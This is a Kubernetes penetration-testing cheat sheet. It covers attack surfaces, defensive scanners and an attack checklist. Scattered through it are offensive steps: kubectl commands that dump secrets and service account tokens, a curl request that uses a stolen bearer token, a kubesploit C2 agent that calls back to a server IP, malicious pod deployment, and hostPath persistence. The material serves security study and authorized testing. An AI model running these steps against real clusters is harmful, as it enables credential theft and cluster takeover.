# Kubernetes

### Overview: Container orchestration platform used to deploy, scale, and manage containerized applications.

#### Key Attack Surfaces:

- **API Server**: Often exposed; check for misconfigurations or unauthenticated access.
- **Kubelet**: May allow command execution or access to container logs.
- **Etcd**: Stores cluster state; sensitive if exposed.
- **RBAC Misconfigurations**: Overly permissive roles can lead to privilege escalation.
- **Network Policies**: Lack of segmentation can allow lateral movement.

### Tools:
#### Attack tools
- [**kubiscan**](https://github.com/cyberark/KubiScan): Scans Kubernetes ~/.kube/config file for exploitable security issues.

```bash
[#] Download the repo and spin up the docker container. This copies ./kube/config file to the container and opens shell with kubiscan installed:

./docker_run.sh ~/.kube/config
kubiscan -rp    #find risky pods
kubiscan -rs    #find risky subjects (users)
kubiscan -aars "[username]" -ns "[namespace]" -k "[ServiceAccount, User]"   #find risky user's roles
kubiscan -aarbs "[username]" -ns "[namespace]" -k "[ServiceAccount, User]"   #find user's rolebindings

[#] if user has 'read-secrets-rolebinding' use kubectl to get account token to read secrets:
kubectl get secrets -n [namespace] #find token name
kubectl get secret -n [namespace] [token-name] -o yaml  #get account token
kubectl cluster-info    #find coreDNS instance URL

[#] test if user token can read secrets from [namespace]:
curl -k -H "Authorization: Bearer [TOKEN]" -H "Content-Type: application/json" https://[coreDNS_URL]/api/v1/namespaces/[namespace]/secrets
```
        
- [**Trivy**](https://github.com/aquasecurity/trivy): Hunts for security weaknesses in Kubernetes clusters.
    
```bash
trivy kubernetes --report summary
```

- [**kubesploit**](https://github.com/cyberark/kubesploit): Post-Exploitation C2 Server for Kubernetes.

```bash
# Start the server
./kubesploitServer  

# Start the agent
./agent -url https://<server_ip>:443 &
```

#### Static Code Analysis Tools
- [**kubescape**](https://github.com/kubescape/kubescape): Provides security assessments against multiple frameworks (NSA-CISA, MITRE, CIS)

```bash
kubescape scan ./
```

- [**Kube bench**](https://github.com/aquasecurity/kube-bench): Checks Kubernetes clusters against CIS benchmarks.

```bash
# Apply the kube bench job to the existing k8s cluster
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/refs/heads/main/job.yaml

# See results
kubectl get pods
kubectl logs kube-bench-***  
```

- [**kubescore**](https://github.com/zegl/kube-score): Scores Kubernetes configurations based on security best practices.

```bash
docker run -v $(pwd):/project zegl/kube-score:latest score ./*.yaml
```

- [**checkov**](https://github.com/bridgecrewio/checkov): Static code analysis tool for infrastructure as code.

```bash
# Apply the checkov jobs to an existing k8s cluster
kubectl apply -f https://raw.githubusercontent.com/bridgecrewio/checkov/main/kubernetes/checkov-job.yaml        

# View the output from the job
kubectl get jobs -n checkov
kubectl logs job/checkov -n checkov
```

#### Kubernetes Lab Environments
 - [**Kubernetes Goat**](https://github.com/madhuakula/kubernetes-goat): A deliberately vulnerable Kubernetes cluster for learning and practicing security.
### Resources:

[Kubernetes Security - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html)

[Kubernetes Pentesting - HackTricks Cloud](https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/index.html)

[Working with kubernetes secrets](https://kubernetes.io/docs/tasks/configmap-secret/managing-secret-using-kubectl/)

[Kubernetes Pentest Checklist](https://github.com/SunWeb3Sec/Kubernetes-security)

### What to look for when testing k8s:
- Publicly accessible web apps
- Exposed sensitive interfaces
- Exposed API server
- Credentials
- Internal dashboards
- Side car injection
- Weak RBAC rules
- Overly permissive pod permissions
- `kubeconfig` file

## **Kubernetes Attack Checklist**
### Reconnaissance

- [ ]  Identify exposed Kubernetes API server (`/api`, `/healthz`)
- [ ]  Enumerate open ports (default: 6443, 10250, 10255)
- [ ]  Check for dashboard access (`/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/`)
### Exploitation

- [ ]  Test unauthenticated access to API server
- [ ]  Enumerate service accounts and RBAC roles
- [ ]  Attempt privilege escalation via misconfigured RBAC
- [ ]  Access secrets via API (`/api/v1/secrets`)
- [ ]  Exploit exposed Kubelet endpoints (e.g., `/pods`, `/metrics`)
- [ ]  Abuse container exec (`kubectl exec`) if permissions allow
### Post-Exploitation

- [ ]  Lateral movement via service accounts
- [ ]  Dump secrets and config maps
- [ ]  Persistent access via malicious pods or cronjobs
---
# Common Tactics
### Access
#### Kubeconfig file
The kubeconfig file, also used by kubectl, contains details about Kubernetes clusters including their location and credentials. If the cluster is hosted as a cloud service (such as AKS or GKE), this file is downloaded to the client via cloud commands (e.g., `az aks get-credential` for AKS or `gcloud container clusters get-credentials` for GKE).

If attackers get access to this file, for instance via a compromised client, they can use it for accessing the clusters.
#### Vulnerable public app
Running a public-facing vulnerable application in a cluster can enable initial access to the cluster. A container that runs an application that is vulnerable to remote code execution vulnerability (RCE) may be exploited. If service account is mounted to the container (default behavior in Kubernetes), the attacker will be able to send requests to the API server using this service account credentials.
#### Exposed sensitive interfaces
Exposing a sensitive interface to the internet or within a cluster without strong authentication poses a security risk. Some popular cluster management services were not intended to be exposed to the internet, and therefore don’t require authentication by default. Thus, exposing such services to the internet allows unauthenticated access to a sensitive interface which might enable running code or deploying containers in the cluster by a malicious actor. Examples of such interfaces that were seen exploited include Apache NiFi, Kubeflow, Argo Workflows, Weave Scope, and the Kubernetes dashboard.
#### Kubernetes API Server
The Kubernetes API server is the gateway to the cluster. Actions in the cluster are performed by sending various requests to the RESTful API. The status of the cluster, which includes all the components that are deployed on it, can be retrieved by the API server. Attackers may send API requests to probe the cluster and get information about containers, secrets, and other resources in the cluster.
### Attack
#### kubectl exec
Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (“kubectl exec”)
#### bash
Attackers who have permissions to run a cmd/bash script inside a container can use it to execute malicious code and compromise cluster resources.
#### kubernetes secrets
Developers store secrets in the Kubernetes configuration files, such as environment variables in the pod configuration.
#### deploying a new pod
Attackers may attempt to run their code in the cluster by deploying a container. Attackers who have permissions to deploy a pod or a controller in the cluster (such as DaemonSet \ ReplicaSet\ Deployment) can create a new resource for running their code.
#### SSH server
SSH server running inside a container.
#### Network Mapping
Attackers may try to map the cluster network to get information on the running applications, including scanning for known vulnerabilities. By default, there is no restriction on pods communication in Kubernetes. Therefore, attackers who gain access to a single container, may use it to probe the network.
### Privesc
#### Privileged containers
If an accessible container has overly permissive permissions
#### Privleged RBAC roles
If a user has an overly permissive role or rolebinding
#### Writable hostPath mount
hostPath volume mounts a directory or a file from the host to the container. Attackers who have permissions to create a new container in the cluster may create one with a writable hostPath volume and gain persistence on the underlying host. For example, the latter can be achieved by creating a cron job on the host.

---
### Getting k8s secrets from the command line
```shell
kubectl get secrets 
kubectl get secret [secret_name] -o yaml
```

Local secrets in containers are typically stored in `/var/run/secrets/kubernetes.io/serviceaccount`

With the pod token being in `/token`

You can view permissions with a token using kubectl:

`kubectl auth can-i --list --token=<TOKEN>`

If you are the admin pod, you can create a new malicious pod (manifest files at [bishop fox bad pods](https://github.com/BishopFox/badPods)):

`kubectl --token=<TOKEN> apply -f <NEW_POD.YML>`

---
### Kubernetes Dashboard

The `minikube` dashboard shows up as a go http server in nmap

#### Common **/api/v1/** endpoints:
- secrets
- events
- services
- proxy
- watch
- secrets
- nodes
- namespaces 
- pods
- endpoints
